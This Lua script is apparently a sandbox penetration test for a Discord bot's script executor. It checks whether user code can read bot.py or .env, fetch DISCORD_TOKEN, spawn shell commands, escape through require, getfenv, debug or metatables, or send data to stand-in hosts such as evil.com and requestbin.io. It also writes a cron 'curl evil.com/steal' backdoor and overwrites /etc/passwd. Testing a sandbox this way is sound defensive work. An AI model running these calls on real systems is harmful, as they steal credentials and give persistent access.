-- ═══════════════════════════════════════════════════════════════════════════════
-- SECURITY PENETRATION TEST - Attempt to break sandbox and steal sensitive data
-- ═══════════════════════════════════════════════════════════════════════════════
-- This script attempts EVERY known exploit technique to:
-- 1. Read Discord token from bot.py or environment
-- 2. Access files in the directory
-- 3. Execute system commands
-- 4. Make network requests
-- 5. Break out of the sandbox
-- ═══════════════════════════════════════════════════════════════════════════════

print("🔓 SECURITY PENETRATION TEST - Starting...")
print("Target: Steal Discord token and access sensitive files")
print("")

-- ═══════════════════════════════════════════════════════════════════════════════
-- TEST 1: Direct File System Access
-- ═══════════════════════════════════════════════════════════════════════════════
print("═══ TEST 1: Direct File System Access ═══")

-- Try to read bot.py
local botCode = readfile("src/bot.py")
if botCode and #botCode > 0 then
    print("❌ CRITICAL: Successfully read bot.py")
    print("Content preview:", botCode:sub(1, 100))
else
    print("✅ PASS: Cannot read bot.py")
end

-- Try to read .env file
local envFile = readfile(".env")
if envFile and #envFile > 0 then
    print("❌ CRITICAL: Successfully read .env")
    print("Content:", envFile)
else
    print("✅ PASS: Cannot read .env")
end

-- Try to read Dockerfile
local dockerfile = readfile("Dockerfile")
if dockerfile and #dockerfile > 0 then
    print("❌ CRITICAL: Successfully read Dockerfile")
else
    print("✅ PASS: Cannot read Dockerfile")
end

-- Try path traversal
local pathTraversal = readfile("../../../etc/passwd")
if pathTraversal and #pathTraversal > 0 then
    print("❌ CRITICAL: Path traversal successful!")
else
    print("✅ PASS: Path traversal blocked")
end

print("")

-- ═══════════════════════════════════════════════════════════════════════════════
-- TEST 2: Environment Variable Access
-- ═══════════════════════════════════════════════════════════════════════════════
print("═══ TEST 2: Environment Variable Access ═══")

-- Try os.getenv
if os and os.getenv then
    local token = os.getenv("DISCORD_TOKEN")
    if token then
        print("❌ CRITICAL: Got Discord token from os.getenv():", token)
    else
        print("✅ PASS: os.getenv() blocked or returns nil")
    end
else
    print("✅ PASS: os.getenv not available")
end

print("")

-- ═══════════════════════════════════════════════════════════════════════════════
-- TEST 3: Process Spawning / System Commands
-- ═══════════════════════════════════════════════════════════════════════════════
print("═══ TEST 3: Process Spawning ═══")

-- Try os.execute
if os and os.execute then
    local success = os.execute("echo EXPLOITED")
    if success then
        print("❌ CRITICAL: os.execute() works!")
    else
        print("✅ PASS: os.execute() blocked")
    end
else
    print("✅ PASS: os.execute not available")
end

-- Try io.popen
if io and io.popen then
    local handle = io.popen("cat src/bot.py")
    if handle then
        local result = handle:read("*a")
        if result and #result > 0 then
            print("❌ CRITICAL: io.popen() works! Got:", result:sub(1, 50))
        end
        handle:close()
    else
        print("✅ PASS: io.popen blocked")
    end
else
    print("✅ PASS: io.popen not available")
end

print("")

-- ═══════════════════════════════════════════════════════════════════════════════
-- TEST 4: Network Access
-- ═══════════════════════════════════════════════════════════════════════════════
print("═══ TEST 4: Network Access ═══")

-- Try game:HttpGet (should be logged but not executed)
local httpResult = game:HttpGet("https://requestbin.io/exfiltrate?token=STOLEN")
if httpResult and #httpResult > 0 then
    print("❌ CRITICAL: HTTP request executed! Got:", httpResult:sub(1, 50))
else
    print("✅ PASS: HTTP request blocked")
end

-- Try syn.request
if syn and syn.request then
    local response = syn.request({
        Url = "https://evil.com/steal",
        Method = "POST",
        Body = "DISCORD_TOKEN=stolen"
    })
    if response and response.Success then
        print("❌ CRITICAL: syn.request works!")
    else
        print("✅ PASS: syn.request blocked")
    end
else
    print("✅ PASS: syn.request not available")
end

print("")

-- ═══════════════════════════════════════════════════════════════════════════════
-- TEST 5: Loadstring Exploitation
-- ═══════════════════════════════════════════════════════════════════════════════
print("═══ TEST 5: Loadstring Exploitation ═══")

-- Try to execute malicious code via loadstring
local maliciousCode = [[
    local fs = require("@lune/fs")
    local botContent = fs.readFile("src/bot.py")
    return botContent
]]

local func = loadstring(maliciousCode)
if func then
    local success, result = pcall(func)
    if success and result and #result > 0 then
        print("❌ CRITICAL: Loadstring executed! Stole bot.py:", result:sub(1, 50))
    else
        print("✅ PASS: Loadstring blocked from executing")
    end
else
    print("✅ PASS: Loadstring compilation blocked")
end

print("")

-- ═══════════════════════════════════════════════════════════════════════════════
-- TEST 6: Module Loading (require)
-- ═══════════════════════════════════════════════════════════════════════════════
print("═══ TEST 6: Module Loading ═══")

-- Try to require Lune modules directly
local luneModules = {"@lune/fs", "@lune/net", "@lune/process"}

for _, modName in ipairs(luneModules) do
    local success, mod = pcall(require, modName)
    if success and mod then
        print("❌ CRITICAL: Successfully loaded " .. modName)
        
        -- Try to exploit it
        if modName == "@lune/fs" and mod.readFile then
            local stolen = mod.readFile("src/bot.py")
            if stolen then
                print("❌ CRITICAL: Stole bot.py via require:", stolen:sub(1, 50))
            end
        end
    else
        print("✅ PASS: Cannot require " .. modName)
    end
end

print("")

-- ═══════════════════════════════════════════════════════════════════════════════
-- TEST 7: Debug Library Exploitation
-- ═══════════════════════════════════════════════════════════════════════════════
print("═══ TEST 7: Debug Library Exploitation ═══")

-- Try to get upvalues from functions
if debug and debug.getupvalue then
    -- Try to steal from the sandbox environment
    local function testFunc()
        local secret = "DISCORD_TOKEN_SECRET"
        return secret
    end
    
    local name, value = debug.getupvalue(testFunc, 1)
    if name and value then
        print("⚠️  WARNING: debug.getupvalue works (but may be spoofed)")
    else
        print("✅ PASS: debug.getupvalue returns nil")
    end
else
    print("✅ PASS: debug.getupvalue not available")
end

-- Try to access registry
if debug and debug.getregistry then
    local registry = debug.getregistry()
    if registry and next(registry) then
        print("⚠️  WARNING: debug.getregistry works")
    else
        print("✅ PASS: debug.getregistry returns empty")
    end
else
    print("✅ PASS: debug.getregistry not available")
end

print("")

-- ═══════════════════════════════════════════════════════════════════════════════
-- TEST 8: Metatable Manipulation
-- ═══════════════════════════════════════════════════════════════════════════════
print("═══ TEST 8: Metatable Manipulation ═══")

-- Try to modify string metatable to escape sandbox
if debug and debug.setmetatable then
    local stringMt = debug.getmetatable("")
    if stringMt then
        -- Try to add malicious function
        local oldIndex = stringMt.__index
        stringMt.__index = function(str, key)
            if key == "exploit" then
                return function() return "EXPLOITED" end
            end
            return oldIndex[key]
        end
        
        local result = ("test"):exploit()
        if result == "EXPLOITED" then
            print("❌ CRITICAL: Metatable manipulation successful!")
        else
            print("✅ PASS: Metatable manipulation ineffective")
        end
    else
        print("✅ PASS: Cannot get string metatable")
    end
else
    print("✅ PASS: debug.setmetatable not available")
end

print("")

-- ═══════════════════════════════════════════════════════════════════════════════
-- TEST 9: Global Environment Pollution
-- ═══════════════════════════════════════════════════════════════════════════════
print("═══ TEST 9: Global Environment Pollution ═══")

-- Try to pollute _G
_G.EXPLOIT_FLAG = "EXPLOITED"
if _G.EXPLOIT_FLAG == "EXPLOITED" then
    print("⚠️  WARNING: Can modify _G (isolated but allowed)")
else
    print("✅ PASS: _G modification blocked")
end

-- Try getfenv/setfenv to escape
if getfenv and setfenv then
    local realEnv = getfenv(0)
    if realEnv and realEnv.require then
        print("❌ CRITICAL: Got real environment with require!")
        
        -- Try to use real require
        local success, fs = pcall(realEnv.require, "@lune/fs")
        if success and fs then
            print("❌ CRITICAL: Escaped sandbox via getfenv!")
        else
            print("✅ PASS: Real require blocked")
        end
    else
        print("✅ PASS: getfenv returns sandbox env only")
    end
else
    print("✅ PASS: getfenv/setfenv not available")
end

print("")

-- ═══════════════════════════════════════════════════════════════════════════════
-- TEST 10: Clipboard Exfiltration
-- ═══════════════════════════════════════════════════════════════════════════════
print("═══ TEST 10: Clipboard Exfiltration ═══")

-- Try to steal data via clipboard
setclipboard("STOLEN_DISCORD_TOKEN=ghp_XXXXXXXXXX")
print("✅ Clipboard write logged (but not executed)")

print("")

-- ═══════════════════════════════════════════════════════════════════════════════
-- TEST 11: File Writing for Persistence
-- ═══════════════════════════════════════════════════════════════════════════════
print("═══ TEST 11: File Writing for Persistence ═══")

-- Try to write malicious file
writefile("backdoor.lua", "-- Malicious backdoor code")

-- Try to write to system locations
writefile("/etc/passwd", "root::0:0:root:/root:/bin/bash")
writefile("C:/Windows/System32/evil.exe", "malware")
writefile("../../../etc/cron.d/backdoor", "* * * * * curl evil.com/steal")

print("✅ File writes logged (but not executed)")

print("")

-- ═══════════════════════════════════════════════════════════════════════════════
-- TEST 12: Code Injection via VM Returns
-- ═══════════════════════════════════════════════════════════════════════════════
print("═══ TEST 12: Code Injection via VM Returns ═══")

-- Return a function that tries to escape when executed
local function escapeAttempt()
    print("⚠️  Returned function is being executed")
    
    -- Try to access real environment from here
    local env = getfenv(0)
    if env and env.require then
        print("❌ CRITICAL: Got real require from returned function!")
        local fs = env.require("@lune/fs")
        if fs then
            local token = fs.readFile("src/bot.py")
            print("❌ CRITICAL: Stolen bot.py from returned function!")
            return token
        end
    end
    
    return nil
end

print("✅ Returning escape function (will be caught if executed)")

print("")

-- ═══════════════════════════════════════════════════════════════════════════════
-- FINAL SUMMARY
-- ═══════════════════════════════════════════════════════════════════════════════
print("═══════════════════════════════════════════════════════════════")
print("🔐 SECURITY TEST COMPLETE")
print("═══════════════════════════════════════════════════════════════")
print("")
print("If you see any ❌ CRITICAL messages above, the sandbox is BROKEN!")
print("If you only see ✅ PASS messages, the sandbox is SECURE!")
print("")
print("All exploit attempts have been logged for analysis.")
print("═══════════════════════════════════════════════════════════════")

-- Return the escape function to test VM returned function handling
return escapeAttempt
